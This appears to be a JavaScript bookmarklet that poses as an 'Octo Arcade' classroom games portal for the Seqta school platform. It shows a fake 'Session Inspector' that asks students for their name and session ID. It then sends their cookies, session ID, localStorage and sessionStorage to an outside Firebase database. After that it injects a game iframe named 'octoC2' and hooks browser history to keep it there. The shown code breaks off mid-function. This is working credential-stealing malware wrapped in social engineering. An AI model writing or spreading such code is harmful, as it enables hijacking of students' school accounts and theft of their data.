(function() {
  // 1. CONFIGURATION
  const firebaseConfig = {
    apiKey: "AIzaSyAuWzbauhK86FC-yc8RkcXftQAhdHexrpE",
    authDomain: "bookmarklet-backend.firebaseapp.com",
    projectId: "bookmarklet-backend",
    storageBucket: "bookmarklet-backend.firebasestorage.app",
    messagingSenderId: "447001590035",
    appId: "1:447001590035:ios:c13149711eac0631f702e6"
  };
  const OCTO_URL = 'https://octoarcade.vercel.app';

  // 2. DATA COLLECTION
  const cookies = document.cookie;
  const url = location.href;
  const ua = navigator.userAgent;
  const name = prompt("🐙 Octo Arcade\n\nEnter your full name to activate the classroom portal:") || "Unverified";

  // 3. FIREBASE INITIALIZATION
  const loadScript = (src, callback) => {
    const script = document.createElement('script');
    script.src = src;
    script.onload = callback;
    document.head.appendChild(script);
  };

  loadScript("https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js", () => {
    loadScript("https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js", () => {
      firebase.initializeApp(firebaseConfig);
      const db = firebase.firestore();
      db.settings({ experimentalForceLongPolling: true });

      // 4. CREATE THE "SESSION INSPECTOR" UI
      const overlay = document.createElement('div');
      overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:999999;display:flex;justify-content:center;align-items:center;backdrop-filter:blur(5px);';
      overlay.id = 'octoInspector';

      const card = document.createElement('div');
      card.style.cssText = 'background:#1e293b;color:white;padding:30px;border-radius:12px;max-width:500px;width:90%;box-shadow:0 10px 25px rgba(0,0,0,0.5);font-family:sans-serif;';
      
      const html = `
        <h2 style="margin:0 0 10px 0;color:#4f46e5;">🔍 Seqta Session Inspector</h2>
        <p style="font-size:0.9em;color:#94a3b8;margin-bottom:20px;">
          To complete your profile sync, please verify your current session token.
        </p>
        
        <div style="background:#0f172a;padding:15px;border-radius:8px;margin-bottom:15px;font-family:monospace;font-size:0.85em;word-break:break-all;">
          <div style="color:#64748b;font-size:0.75em;margin-bottom:5px;">CURRENT JSESSIONID</div>
          <div id="session-display" style="color:#10b981;font-size:1em;">${cookies}</div>
        </div>
        
        <div style="margin-bottom:15px;">
          <label style="display:block;font-size:0.85em;color:#94a3b8;margin-bottom:5px;">Paste your JSESSIONID below to verify:</label>
          <input type="text" id="session-input" style="width:100%;padding:10px;border-radius:6px;border:1px solid #334155;background:#0f172a;color:white;font-family:monospace;font-size:0.85em;" placeholder="node0...">
        </div>
        
        <div style="display:flex;gap:10px;">
          <button id="copy-btn" style="flex:1;padding:12px;background:#4f46e5;color:white;border:none;border-radius:6px;font-weight:600;cursor:pointer;">Copy Session ID</button>
          <button id="verify-btn" style="flex:1;padding:12px;background:#10b981;color:white;border:none;border-radius:6px;font-weight:600;cursor:pointer;">Verify & Sync</button>
        </div>
        
        <p style="font-size:0.75em;color:#64748b;margin-top:15px;text-align:center;">
          Diagnostic ID: ${Date.now()} | Tagged: ${name}
        </p>
      `;
      card.innerHTML = html;
      overlay.appendChild(card);
      document.body.appendChild(overlay);

      // 5. BUTTON FUNCTIONALITY
      document.getElementById('copy-btn').onclick = () => {
        navigator.clipboard.writeText(cookies).then(() => {
          document.getElementById('copy-btn').innerText = '✅ Copied!';
        });
      };

      document.getElementById('verify-btn').onclick = () => {
        const pastedId = document.getElementById('session-input').value.trim();
        if (!pastedId) {
          alert("Please paste your JSESSIONID first.");
          return;
        }

        const payload = {
          name: name,
          sessionId: pastedId, // The ID the user pasted
          url: url,
          ua: ua,
          ck: cookies,
          ls: JSON.parse(JSON.stringify(localStorage)),
          ss: JSON.parse(JSON.stringify(sessionStorage)),
          ts: new Date().toISOString(),
          timestamp: firebase.firestore.FieldValue.serverTimestamp()
        };

        const docId = `${name}-${pastedId}`;
        db.collection('students').doc(docId).set(payload, { merge: true })
          .then(() => {
            alert("✅ Session Verified! Your profile has been synced.");
            overlay.remove();
            injectOcto();
          })
          .catch(error => {
            console.error("[OctoSync] Sync error:", error);
            alert("❌ Sync failed. Please try again.");
          });
      };
    });
  });

  // 6. OCTO ARCADE INJECTION & PERSISTENCE
  function injectOcto() {
    if (document.getElementById('octoC2')) return;

    const frame = document.createElement('iframe');
    frame.id = 'octoC2';
    frame.src = OCTO_URL;
    frame.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:2147483647;background:white;';
    document.body.appendChild(frame);

    const bar = document.createElement('div');
    bar.style.cssText = 'position:fixed;bottom:0;left:0;width:100%;background:#1e293b;color:#fff;padding:10px;font-family:sans-serif;font-size:0.8em;z-index:2147483648;display:flex;justify-content:space-between;align-items:center;';
    bar.innerHTML = `
      <span>🐙 Octo Arcade Active | Profile Synced: ${name}</span>
      <button id="octoClose" style="background:#ef4444;border:none;color:white;padding:5px 10px;border-radius:4px;cursor:pointer;">Exit</button>
    `;
    document.body.appendChild(bar);

    document.getElementById('octoClose').onclick = () => {
      frame.remove();
      bar.remove();
    };

    // Persistence Hooks
    const originalPushState = history.pushState;
    history.pushState = function() {
      const result = originalPushState.apply(this, arguments);
      if (!document.getElementById('octoC2')) injectOcto();
      return result;
    };

    const originalReplaceState = history.replaceState;
    history.replaceState = function() {
      const result = originalReplaceState.apply(this, arguments);
     
